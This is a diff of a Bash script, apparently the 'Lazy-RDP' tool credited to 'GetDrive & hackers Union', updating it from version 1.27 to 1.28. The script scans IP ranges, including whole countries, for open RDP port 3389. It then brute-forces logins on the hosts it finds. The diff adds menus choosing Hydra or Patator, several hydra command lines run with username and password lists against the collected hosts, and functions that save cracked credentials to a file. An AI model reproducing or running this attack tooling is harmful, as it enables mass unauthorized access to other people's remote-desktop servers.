@@ -1,6 +1,6 @@
 #!/bin/bash
 # NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
-ver=1.27
+ver=1.28
 clear
 ##########################################COLOR######################################
 colorbase="\E[0m"
@@ -13,98 +13,15 @@ grey="\033[1;37m"
 ##########################################CLEAR#######################################
 CLEARALL ()
 {
-rm -rf Results/ paused.conf list all_results 2> /dev/null
+rm -rf Results/ paused.conf list all_results result 2> /dev/null
 }
 ######################################################################################
-CHECKDISTR ()
-{
-distr=$(cat /etc/*-release | awk -F'=' '/DISTRIB_CODENAME=/ {print $2}')
-distrp=$(cat /etc/*-release | awk -F'=' '/DISTRIB_ID=/ {print $2}')
-	if [ "$distr" = "sana" ]; then
-	cat /etc/apt/sources.list > /etc/apt/sources.list_lazybak
-		echo "deb http://old.kali.org/kali sana main non-free contrib" > /etc/apt/sources.list
-	elif [ "$distr" = "kali-rolling" ]; then
-	cat /etc/apt/sources.list > /etc/apt/sources.list_lazybak
-		echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" > /etc/apt/sources.list
-	elif [ "$distrp" = "Parrot" ]; then
-	cat /etc/apt/sources.list > /etc/apt/sources.list_lazybak
-		echo "deb http://archive.parrotsec.org/parrot parrot main contrib non-free" > /etc/apt/sources.list
-	
-	else
-		echo -e "$aquamarine[Скрипт тестировался только для $red[Kali Linux2 и ParrotSec]$aquamarine. Вы можете самостоятельно изменить код скрипта для своей ОС.]$colorbase"
-		echo -e "$aquamarine[The script was tested only for $red[Kali Linux2 & ParrotSec]$aquamarine. You are free to modify the code for your operating system]$colorbase"
-	exit 1
-fi
-}
-######################################################################################
-CHECKDEPEND0 ()
-{
-depend=$(dpkg -s masscan  | grep 'Status' | awk -F':' '/Status: / {print $2}')
-	if [ "$depend" = " install ok installed" ]; then
-		clear 
-			
-			else
-			echo -e "$aquamarine"
-		while true; do
-		echo    "Требующийся пакет MASSCAN не установлен. Установить?"
-                read -p "The required package MASSCAN is not installed Install?[Y][N]" yn
-			case $yn in
-			[Yy]* ) apt-get update -y && apt-get dist-upgrade -y; apt install masscan -y; break;;
-			[Nn]* ) exit;;
-			* ) echo "Enter answer [Y] or [N] ";;
-		esac
-	done
-fi
 
-}
-######################################################################################
-CHECKDEPEND1 ()
-{
-depend=$(dpkg -s nmap | grep 'Status' | awk -F':' '/Status: / {print $2}')
-	if [ "$depend" = " install ok installed" ]; then
-		clear 
-			else
-			echo -e "$aquamarine"
-		while true; do
-		echo    "Требующийся пакет nmap не установлен. Установить?"
-                read -p "The required package nmap is not installed Install?[Y][N]" yn
-			case $yn in
-			[Yy]* ) apt-get update -y && apt-get dist-upgrade -y; apt install nmap -y; break;;
-			[Nn]* ) exit;;
-			* ) echo "Enter answer [Y] or [N] ";;
-		esac
-	done
-fi
-
-}
-######################################################################################
-CHECKDEPEND ()
-{
-depend=$(dpkg -s freerdp-x11 || dpkg -s freerdp2-x11  | grep 'Status' | awk -F':' '/Status: / {print $2}')
-	if [ "$depend" = " install ok installed" ]; then
-		clear 
-			else
-			echo -e "$aquamarine"
-		while true; do
-		echo    "Требующийся пакет FreeRDP не установлен. Установить?"
-                read -p "The required package FreeRDP is not installed Install?[Y][N]" yn
-			case $yn in
-			[Yy]* ) apt-get update -y && apt-get dist-upgrade -y; apt install freerdp-x11 libfreerdp-plugins-standard remmina -y || apt install freerdp2-x11 remmina -y; break;;
-			[Nn]* ) exit;;
-			* ) echo "Enter answer [Y] or [N] ";;
-		esac
-	done
-fi
-
-}
 ######################################################################################
 
 ######################################################################################
 CLEARALL
-CHECKDISTR
-CHECKDEPEND0
-CHECKDEPEND1
-CHECKDEPEND
+
 cat /etc/apt/sources.list_lazybak>/etc/apt/sources.list
 rm -rf /etc/apt/sources.list_lazybak 2> /dev/null
 clear
@@ -113,7 +30,7 @@ clear
 echo -e       "$grey                                 +--------------------------------------+" 
 echo -e       "$grey                                 |             Auto  Script             |"
 echo -e "$aquamarine                                 |     by GetDrive & hackers Union      |" 
-echo -e        "$red                                 |             Version 1.27             |"
+echo -e        "$red                                 |             Version 1.28             |"
 #echo -e        "$red                                 |$colorbase https://github.com/getdrive/Lazy-RDP$red |"
 echo -e        "$red                                 +--------------------------------------+ $colorbase"
 #####################################CHECKLANGUAGE####################################
@@ -316,7 +233,7 @@ echo -e "               +-------------------------------------------------------
 echo -e "               |$grey 1.$yellow Сканировать диапазон на наличие открытого RDP порта (ввод вручную)$colorbase | ";
 echo -e "               |$grey 2.$yellow Сканировать диапазон на наличие открытого RDP порта (из файла)$colorbase     | ";
 echo -e "               |$grey 3.$yellow Брутфорс Логин/Пароль (последнее сканирование)$colorbase                     | ";
-echo -e "               |$grey 4.$yellow Выбор диапазона IP по стране $colorbase                                      | ";
+echo -e "               |$grey 4.$yellow Выбор диапазона IP по стране($redвременно не работает$yellow)$colorbase                 | ";
 echo -e "               |$grey 5.$yellow Выход ($red[ENTER]$yellow) $colorbase                                                   | ";
 echo -e "               +-----------------------------------------------------------------------+"
 echo " "
@@ -325,6 +242,7 @@ read -p "                                             Выбор из меню :
 if [ "$menuoption" = "1" ]; then
 echo -e "$red---------------------------------------------------------------------------------------------------------$aquamarine"
 read -p "Введите диапазон или одиночный IP {x.x.x.x/24,x.x.x.0-x.x.x.255} : " target
+clear
 echo -e " $colorbase              +-----------------------------------------------------------------------+"   
 echo -e "               |   $grey                            1.$yellow Nmap$colorbase                                 |";
 echo -e "               |   $grey                            2.$yellow Masscan$colorbase                              |";
@@ -389,7 +307,7 @@ if [ "$menuoption" = "2" ]; then
 echo -e "$aquamarine**************************************************************************************************$green"
 read -p "*Введите путь к файлу с диапазонами IP {listip.txt,listip..& etc.} : " listname
 
-#clear
+clear
 echo -e " $colorbase              +-----------------------------------------------------------------------+"   
 echo -e "               |   $grey                            1.$yellow Nmap$colorbase                                 |";
 echo -e "               |   $grey                            2.$yellow Masscan$colorbase                              |";
@@ -456,7 +374,8 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
 echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
 
-
+# http://www.nirsoft.net/countryip
+#
 MAINBRUTEMENURU
 else
 if [ "$menuoption" = "4" ]; then
@@ -469,7 +388,7 @@ clear
 echo -e "$aquamarine                                             Получаем список IP"
 echo ""
 if [ "$country"  = "1" ]; then
-curl http://ipdiapazon.16mb.com/Afghanistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g" > list
+curl http://services.ce3c.be/ciprg/?countrys=AFGANISTAN%2Cformat=peerguardian |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Afghanistan://g" > list
 echo -e "$red---------------------------------------------------------------------------------------------------------$green"
 cat list
 echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
@@ -529,7 +448,7 @@ clear
 echo -e "$aquamarine                                             Получаем список IP"
 echo ""
 if [ "$country"  = "2" ]; then
-curl http://ipdiapazon.16mb.com/Albania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+curl http://ipdiapazon.16mb.com/Albania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Albania://g">list
 clear
 echo -e "$red---------------------------------------------------------------------------------------------------------$green"
 cat list
@@ -597,7 +516,7 @@ echo ""
 
 
 if [ "$country"  = "3" ]; then
-curl http://ipdiapazon.16mb.com/Algeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+curl http://ipdiapazon.16mb.com/Algeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Algeria://g">list
 echo -e "$red---------------------------------------------------------------------------------------------------------$green"
 cat list
 echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
@@ -14894,7 +14813,7 @@ echo -e "               +-------------------------------------------------------
 echo -e "               |        $grey 1.$yellow Scan range to find an open RDP port (manual entry)$colorbase         | ";
 echo -e "               |        $grey 2.$yellow Scan range to find an open RDP port (from a file)$colorbase          | ";
 echo -e "               |        $grey 3.$yellow Bruteforce Username/Password (last scan)$colorbase                   | ";
-echo -e "               |        $grey 4.$yellow Selecting the range of IP for the country $colorbase                 | ";
+echo -e "               |        $grey 4.$yellow Range of IP for the country$red(temporarily out of service)$colorbase    | ";
 echo -e "               |        $grey 5.$yellow Exit ($red[ENTER]$yellow) $colorbase                                            | ";
 echo -e "               +-----------------------------------------------------------------------+"
 read -p "                                          Сhoose from a menu : " menuoption
@@ -28639,7 +28558,7 @@ echo ""
 MAINBRUTEMENUEN
 
 if [ "$menuoption" = "5" ]; then
-
+clear
 CLEARALL
 exit;
 fi
@@ -28887,9 +28806,27 @@ echo ""
 fi
 done
 
+clear
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                          1.$yellow Hydra  9.0           $colorbase                  |";
+echo -e "               |   $grey                          2.$yellow Patator0.7$colorbase                             |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                          Выберите брутфорсер : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+	clear
+
+echo -e "                                            $green Запуск брутфорса$colorbase"
+	
+hydra -l $loginbrute -P $passlist -t 16 -vV -I -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+	TESTRESULTRU_H
+
+
+else
 
 clear
-echo -e "                                            $green Запуск брутфорса"
+echo -e "                                            $green Запуск брутфорса$colorbase"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] => $green"
 echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
@@ -28907,7 +28844,7 @@ TESTRESULTRU
 exit;
 ./rdp_brute.sh
 fi
-
+fi
 
 if [ "$brutmenu" = "2" ]; then
 echo -e "$aquamarine***************************************************************************************************$green"
@@ -28925,8 +28862,28 @@ echo ""
 fi 
 done
 
+
 clear
-echo -e "                                            $green Запуск брутфорса"
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                          1.$yellow Hydra  9.0           $colorbase                  |";
+echo -e "               |   $grey                          2.$yellow Patator0.7$colorbase                             |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                          Выберите брутфорсер : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+	clear
+
+echo -e "                                            $green Запуск брутфорса$colorbase"
+	
+hydra -L $loginlist -p $passbrute  -t 16 -vV -I -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+	TESTRESULTRU_H
+
+
+	else
+
+clear
+echo -e "                                            $green Запуск брутфорса$colorbase"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
@@ -28934,13 +28891,14 @@ echo ""
 
 python patator.py rdp_login host=FILE0 port=$port user=FILE1 password=$passbrute 0=open3389 1=users -t 120 --max-retries=0 -x ignore:code=1 -x ignore:code=-11 -x ignore:fgrep='FAIL',size=500-700 -l $PWD/Results
 #python crowbar.py -b rdp -U $loginlist -c $passbrute -S $PWD/open
-#hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+#hydra -L $loginlist -p $passbrute -vV -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 
 clear
 TESTRESULTRU
 ./rdp_brute.sh
 exit;
 ./rdp_brute.sh
+fi
 fi
 
 if [ "$brutmenu" = "3" ]; then
@@ -28960,7 +28918,26 @@ fi
 done
 
 clear
-echo -e "                                            $green Запуск брутфорса"
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                          1.$yellow Hydra  9.0           $colorbase                  |";
+echo -e "               |   $grey                          2.$yellow Patator0.7$colorbase                             |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                          Выберите брутфорсер : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+	clear
+
+echo -e "                                            $green Запуск брутфорса$colorbase"
+	
+hydra -L $loginlist -P $passlist -vV -t 16 -I -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+	
+	TESTRESULTRU_H
+
+	else
+
+
+clear
+echo -e "                                            $green Запуск брутфорса$colorbase"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
@@ -28978,12 +28955,30 @@ sleep 2
 exit;
 ./rdp_brute.sh
 fi
-
+fi
 
 if [ "$brutmenu" = "4" ]; then
+clear
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                1.$yellow Hydra  9.0           $colorbase                           |";
+echo -e "               |   $grey                2.$yellow Patator0.7$colorbase                                      |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                        Выберите брутфорсер : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+	clear
+
+echo -e "                                            $green Запуск брутфорса$colorbase"
+	
+hydra -L $PWD/users -P $PWD/dict/pass -I -t 16 -vV -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+	
+	TESTRESULTRU_H
+
+	else
 
 clear
-echo -e "                                            $green Запуск брутфорса"
+echo -e "                                            $green Запуск брутфорса$colorbase"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] =>$green "
 echo -e "$yellow*Поставить на паузу/Снять с паузы  $aquamarine[P]=>[ENTER] => $green"
@@ -28999,6 +28994,7 @@ TESTRESULTRU
 ./rdp_brute.sh
 exit;
 ./rdp_brute.sh
+fi
 fi
 
 if [ "$brutmenu" = "5" ]; then
@@ -29039,6 +29035,26 @@ break
 echo ""
 fi
 done
+clear
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                          1.$yellow Hydra  9.0           $colorbase                  |";
+echo -e "               |   $grey                          2.$yellow Patator0.7$colorbase                             |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                          Choice bruteforce tool : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+
+if [ "$btool" = "1" ]; then
+	clear
+
+echo -e "                                         $green Start bruteforceing$colorbase"
+	
+hydra -l $loginbrute -P $passlist -t 16 -vV -I -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+	TESTRESULTEN_H
+
+
+else
 
 clear
 echo -e "                                          $green Start bruteforceing"
@@ -29058,6 +29074,7 @@ TESTRESULTEN
 exit;
 ./rdp_brute.sh
 fi
+fi
 
 
 if [ "$brutmenu" = "2" ]; then
@@ -29076,6 +29093,26 @@ break
 echo ""
 fi
 done
+clear
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                          1.$yellow Hydra  9.0           $colorbase                  |";
+echo -e "               |   $grey                          2.$yellow Patator0.7$colorbase                             |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                          Choice bruteforce tool : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+
+if [ "$btool" = "1" ]; then
+	clear
+
+echo -e "                                           $green Start bruteforceing$colorbase"
+	
+hydra -L $loginlist -p $passbrute -t 16 -I -vV -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+	TESTRESULTEN_H
+
+
+else
 
 clear
 echo -e "                                           $green Start bruteforceing"
@@ -29094,7 +29131,7 @@ TESTRESULTEN
 exit;
 ./rdp_brute.sh
 fi
-
+fi
 
 if [ "$brutmenu" = "3" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
@@ -29111,6 +29148,26 @@ break
 echo ""
 fi
 done
+clear
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                          1.$yellow Hydra  9.0           $colorbase                  |";
+echo -e "               |   $grey                          2.$yellow Patator0.7$colorbase                             |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                          Choice bruteforce tool : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+
+if [ "$btool" = "1" ]; then
+	clear
+
+echo -e "                                           $green Start bruteforceing$colorbase"
+	
+hydra -L $loginlist -P $passlist -t 16 -vV -I -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+	TESTRESULTEN_H
+
+
+else
 
 clear
 echo -e "                                           $green Start bruteforceing"
@@ -29129,9 +29186,32 @@ TESTRESULTEN
 exit;
 ./rdp_brute.sh
 fi
+fi
 
 if [ "$brutmenu" = "4" ]; then
 clear
+
+clear
+
+echo -e " $colorbase              +-----------------------------------------------------------------------+"   
+echo -e "               |   $grey                          1.$yellow Hydra  9.0           $colorbase                  |";
+echo -e "               |   $grey                          2.$yellow Patator0.7$colorbase                             |";
+echo -e "               +-----------------------------------------------------------------------+"
+read -p "                                          Choice bruteforce tool : " btool
+echo -e "$red-------------------------------------------------------------------------------"
+if [ "$btool" = "1" ]; then
+	clear
+
+echo -e "                                           $green Start bruteforceing$colorbase"
+	
+hydra -L $PWD/users -P $PWD/dict/pass -I -t 16 -vV -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+
+	
+	TESTRESULTRU_H
+
+	else
+
+
 echo -e "                                           $green Start bruteforceing"
 echo ""
 echo -e "$yellow*To refresh INFO-Progress press $aquamarine[ENTER]=> $green"
@@ -29156,6 +29236,7 @@ echo ""
 ./src/rdp_brute.sh
 exit;
 ./rdp_brute.sh
+fi
 fi
 }
 
@@ -29195,6 +29276,80 @@ exit;
 fi	
 }
 ########################################################################################
+
+######################################TESTRESULTRU_H#######################################
+TESTRESULTRU_H ()
+{
+clear
+cat $PWD/result |grep -v "# Hydra v9.0 run at"|grep -E '[DATA]|[STATUS]|host|login|password' > all_results
+if [ -s all_results ]
+	then
+	#clear
+	cat all_results |grep -v "# Hydra v9.0 run at"|grep -E '[DATA]|[STATUS]|host|login|password' >> good
+	cat all_results
+	echo ""
+ echo -e "$colorbase                                       +---------------------------+"
+ echo -e "$colorbase                                       |$red   Логин/Пароль найден!    $colorbase|";
+ echo -e           "                                       +---------------------------+$red"
+	echo ""
+	echo -e "$yellow*Логин/Пароль записаны в файл $red $PWD/good"
+	echo ""
+	echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh	
+	else
+ echo -e "$colorbase                                       +---------------------------+"
+ echo -e "$colorbase                                       |$red Логин/Пароль не найден :( $colorbase|";
+ echo -e           "                                       +---------------------------+$red"
+ 
+ echo -e ""
+ echo -e "Нажмите$aquamarine [ENTER]$red для перехода в Главное меню"
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi	
+}
+########################################################################################
+
+######################################TESTRESULTEN_H#######################################
+TESTRESULTEN_H ()
+{
+clear
+cat $PWD/result |grep -v "# Hydra v9.0 run at"|grep -E '[DATA]|[STATUS]|host|login|password' > all_results
+if [ -s all_results ]
+	then
+	#clear
+	cat all_results |grep -v "# Hydra v9.0 run at"|grep -E '[DATA]|[STATUS]|host|login|password' >> good
+	cat all_results
+	echo ""
+ echo -e "$colorbase                          +-------------------------+"
+ echo -e "$colorbase                          |$red  Login/Password found!  $colorbase|";
+ echo -e           "                          +-------------------------+$red"
+	echo ""
+ echo -e "$yellow*Login/Password written to the file $red $PWD/good$colorbase"
+	echo ""
+ echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh	
+	else
+ echo -e "$colorbase                                      +-----------------------------+"
+ echo -e "$colorbase                                      |$red Login/Password not found :( $colorbase|";
+ echo -e           "                                      +-----------------------------+$red"
+ 
+ echo -e ""
+ echo -e "Press$aquamarine [ENTER]$red to return to the Main menu "
+read -p ""
+./src/rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi	
+}
+
 ######################################TESTRESULTEN######################################
 TESTRESULTEN ()
 {
